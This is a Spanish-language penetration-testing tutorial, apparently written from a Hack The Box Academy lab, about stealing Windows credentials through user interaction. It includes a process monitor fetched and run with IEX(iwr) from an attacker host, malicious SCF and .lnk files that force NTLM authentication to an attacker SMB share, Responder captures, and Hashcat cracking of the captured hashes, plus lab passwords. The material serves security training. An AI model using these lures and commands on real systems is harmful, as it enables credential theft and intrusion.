
# Interacción con usuarios

Los usuarios son a veces el eslabón más débil de una organización. Un empleado sobrecargado que trabaja rápidamente puede no notar que algo no funciona bien en su equipo cuando navega por una unidad compartida, hace clic en un enlace o ejecuta un archivo. Como se ha comentado a lo largo de este módulo, Windows nos presenta una enorme superficie de ataque y hay muchas cosas que comprobar al enumerar los vectores de escalada de privilegios locales.&#x20;

Una vez que hemos agotado todas las opciones, podemos buscar técnicas específicas para robar credenciales de un usuario desprevenido espiando su tráfico de red/comandos locales o atacando un servicio vulnerable conocido que requiera la interacción del usuario. Una de mis técnicas favoritas es colocar archivos maliciosos en recursos compartidos de archivos a los que se accede con frecuencia en un intento de recuperar los hashes de contraseñas de los usuarios para descifrarlos sin conexión más tarde.

***

## <mark style="color:purple;">Captura de tráfico</mark>

Si `Wireshark` está instalado, los usuarios sin privilegios pueden capturar el tráfico de red, ya que la opción para restringir el acceso del controlador Npcap solo a los administradores no está habilitada de forma predeterminada.

![imagen](https://academy.hackthebox.com/storage/modules/67/pcap.png)

Aquí podemos ver un ejemplo aproximado de captura de credenciales FTP en texto sin formato ingresadas por otro usuario mientras está conectado al mismo equipo. Si bien no es muy probable, si `Wireshark` está instalado en un equipo en el que aterrizamos, vale la pena intentar una captura de tráfico para ver qué podemos detectar.

![imagen](https://academy.hackthebox.com/storage/modules/67/ftp.png)

Además, supongamos que nuestro cliente nos posiciona en una máquina de atacante dentro del entorno. En ese caso, vale la pena ejecutar `tcpdump` o `Wireshark` por un tiempo para ver qué tipos de tráfico pasan por la red y si podemos ver algo interesante. La herramienta [net-creds](https://github.com/DanMcInerney/net-creds) se puede ejecutar desde nuestra máquina de ataque para rastrear contraseñas y hashes desde una interfaz en vivo o un archivo pcap. Vale la pena dejar que esta herramienta se ejecute en segundo plano durante una evaluación o ejecutarla contra un pcap para ver si podemos extraer alguna credencial útil para la escalada de privilegios o el movimiento lateral.

***

## <mark style="color:purple;">Líneas de comandos de proceso</mark>

### **Monitoreo de líneas de comando de procesos**

Al obtener un shell como usuario, puede haber tareas programadas u otros procesos en ejecución que pasan credenciales en la línea de comandos. Podemos buscar líneas de comandos de procesos utilizando algo como este script que se muestra a continuación. Captura líneas de comandos de procesos cada dos segundos y compara el estado actual con el estado anterior, mostrando las diferencias.

```python
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

### **Ejecución de procmon en el host de destino**

Podemos alojar el script en nuestra máquina de ataque y ejecutarlo en el host objetivo de la siguiente manera.

```powershell
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1') 

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>      
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>       
@{CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=
```

Esto es exitoso y revela la contraseña del usuario `sqlsvc`, que luego podríamos usar para obtener acceso al host `SQL02` o potencialmente encontrar datos confidenciales como credenciales de base de datos en el recurso compartido `backups`.

***

## <mark style="color:purple;">Servicios vulnerables</mark>

También podemos encontrarnos con situaciones en las que aterrizamos en un host que ejecuta una aplicación vulnerable que se puede usar para elevar privilegios a través de la interacción del usuario. [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) es un gran ejemplo de esto. Esta era una vulnerabilidad en Docker Desktop Community Edition antes de 2.1.0.1. Cuando se inicia esta versión particular de Docker, busca varios archivos diferentes, incluidos `docker-credential-wincred.exe`, `docker-credential-wincred.bat`, etc., que no existen con una instalación de Docker. El programa busca estos archivos en el directorio `C:\PROGRAMDATA\DockerDesktop\version-bin\`. Este directorio estaba mal configurado para permitir acceso de escritura completo al grupo `BUILTIN\Users`, lo que significa que cualquier usuario autenticado en el sistema podría escribir un archivo en él (como un ejecutable malicioso).

Cualquier ejecutable ubicado en ese directorio se ejecutaría cuando:

1. Se inicie la aplicación Docker y&#x20;
2. Cuando un usuario se autentique usando el comando `docker login`.&#x20;

Si bien es un poco más antiguo, no está fuera del ámbito de la posibilidad encontrar una estación de trabajo de desarrollador ejecutando esta versión de Docker Desktop, por lo que siempre es importante enumerar minuciosamente el software instalado. Si bien esta falla en particular no nos garantizaría un acceso elevado (ya que depende de un reinicio del servicio o una acción del usuario), podríamos colocar nuestro ejecutable durante una evaluación a largo plazo y verificar periódicamente si se ejecuta y nuestros privilegios están elevados.

***

## <mark style="color:purple;">SCF en un recurso compartido de archivos</mark>

El Explorador de Windows utiliza un archivo de comandos de Shell (SCF) para desplazarse hacia arriba y hacia abajo por directorios, mostrar el escritorio, etc. Se puede manipular un archivo SCF para que la ubicación del archivo de iconos apunte a una ruta UNC específica y hacer que el Explorador de Windows inicie una sesión SMB cuando se acceda a la carpeta donde se encuentra el archivo .scf.&#x20;

Si cambiamos el IconFile a un servidor SMB que controlamos y ejecutamos una herramienta como [Responder](https://github.com/lgandx/Responder) , [Inveigh](https://github.com/Kevin-Robertson/Inveigh) o [InveighZero](https://github.com/Kevin-Robertson/InveighZero) , a menudo podemos capturar hashes de contraseñas NTLMv2 para cualquier usuario que explore el recurso compartido. Esto puede ser particularmente útil si obtenemos acceso de escritura a un recurso compartido de archivos que parece ser muy utilizado o incluso a un directorio en la estación de trabajo de un usuario. Es posible que podamos capturar el hash de la contraseña de un usuario y utilizar la contraseña en texto sin formato para aumentar los privilegios en el host de destino, dentro del dominio o para ampliar nuestro acceso/obtener acceso a otros recursos.

### **Archivo SCF malicioso**

En este ejemplo, vamos a crear el siguiente archivo y nombrarlo de una forma similar a `@Inventory.scf` (similar a otro archivo en el directorio, para que no parezca fuera de lugar). Ponemos un `@`al comienzo del nombre del archivo para que aparezca en la parte superior del directorio para asegurarnos de que Windows Explorer lo vea y lo ejecute tan pronto como el usuario acceda al recurso compartido. Como estamos conectados por VPN aquí ponemos nuestra dirección IP `tun0` y cualquier nombre de recurso compartido falso y el nombre de archivo .ico.

```bash
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

### **Iniciando Responder**

A continuación, inicia Responder en la máquina de atacante y espera a que el usuario navegue por el recurso compartido. Si todo sale como está previsto, veremos el hash de la contraseña NTLMV2 del usuario en nuestra consola e intentaremos descifrarlo sin conexión.

```shell-session
afsh4ck@kali$ sudo responder -wrf -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [tun2]
    Responder IP               [10.10.14.3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']


[!] Error starting SSL server on port 443, check permissions or other servers running.
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
```

### **Descifrado de hash NTLMv2 con Hashcat**

Luego podríamos intentar descifrar este hash de contraseña sin conexión con `Hashcat` para recuperar el texto sin formato.

```shell-session
afsh4ck@kali$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...:Welcome1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:afb6d3...000000
Time.Started.....: Thu May 27 19:16:18 2021 (1 sec)
Time.Estimated...: Thu May 27 19:16:19 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1233.7 kH/s (2.74ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 43008/14344385 (0.30%)
Rejected.........: 0/43008 (0.00%)
Restore.Point....: 36864/14344385 (0.26%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: holabebe -> harder

Started: Thu May 27 19:16:16 2021
Stopped: Thu May 27 19:16:20 2021
```

{% hint style="warning" %}
**Nota**: En nuestro ejemplo, esperé entre 2 y 5 minutos para que el "usuario" explore el recurso compartido después de iniciar Responder.
{% endhint %}

***

## <mark style="color:purple;">Captura de hashes con un archivo .lnk malicioso</mark>

El uso de SCF ya no funciona en los hosts Windows Server 2019, pero podemos lograr el mismo efecto utilizando un archivo [.lnk](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943) malicioso . Podemos utilizar varias herramientas para generar un archivo .lnk malicioso, como [Lnkbomb](https://github.com/dievus/lnkbomb) , ya que no es tan sencillo como crear un archivo .scf malicioso. También podemos crear uno utilizando algunas líneas de PowerShell:

### **Generación de un archivo .lnk malicioso**

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

Pruebe esta técnica en el host de destino para familiarizarse con la metodología y agregar otra táctica a su arsenal para cuando encuentre entornos donde prevalece Server 2019.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.43 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "htb-student" y contraseña "HTB_@cademy_stdnt!"
```

### Pregunta 1

> Utilizando las técnicas de esta sección, obtén las credenciales en plano para el usuario `SCCM_SVC`.

Vamos a crear un archivo SCF malicioso con el nombre `@evil.scf`

{% code title="@evil.scf" %}

```powershell
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

{% endcode %}

#### Envío del SCF malicioso

```bash
python3 -m htt.pserver 80
```

Desde un CMD nos lo descargamos con certutil.exe:

```powershell
C:\Users\htb-student>certutil.exe -f -urlcache -split http://10.10.15.66/@evil.scf

****  Online  ****
  0000  ...
  0059
CertUtil: -URLCache command completed successfully.
```

Uva vez descargado tenemos que colocar el archivo en un directorio accesible por el usuario `SCCM_SVC`, como `C:/Department Shares`. Debemos buscar una carpeta con permisos de escritura para colocar el archivo, como en este caso la de IT.

#### Iniciar responder en Kali

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ sudo responder -v -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    
    [+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.43.43
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\sccm_svc
[SMB] NTLMv2-SSP Hash     : sccm_svc::WINLPE-SRV01:e41df8f1c1a8ad3d:016B455F1FEC18374D04B9800D6B9787:010100000000000000C8DC6E299FDB01A921C1AFFB098C8300000000020008004A0037003900390001001E00570049004E002D004D00310035004C00420030005000480034004200560004003400570049004E002D004D00310035004C0042003000500048003400420056002E004A003700390039002E004C004F00430041004C00030014004A003700390039002E00<----SNIP---->0000000000000000000000000
```

{% endcode %}

Tras unos minutos de esperan obtenemos el hash del usuario SCCM\_SVC, lo que significa que este usuario hizo clic en el archivo SCF malicioso.

#### Crackeo del hash

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

SCCM_SVC::WINLPE-SRV01:e41df8f1c1a8ad3d:016B455F1FEC18374D04B9800D6B9787:010100000000000000C8DC6E299FDB01A921C1AFFB098C8300000000020008004A0037003900390001001E00570049004E002D004D00310035004C00420030005000480034004200560004003400570049004E002D004D00310035004C0042003000500048003400420056002E004A003700390039002E004C004F00430041004C00030014004A003700390039002E00<----SNIP---->0000000000000000000000000:Pass*******
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SCCM_SVC::WINLPE-SRV01:e41df8f1c1a8ad3d:016b455f1fe...000000
Time.Started.....: Thu Mar 27 15:09:33 2025 (1 sec)
Time.Estimated...: Thu Mar 27 15:09:34 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   359.9 kH/s (6.40ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> whitetiger
Hardware.Mon.#1..: Util:  6%
```

{% endcode %}

Obtenemos la contraseña en plano!
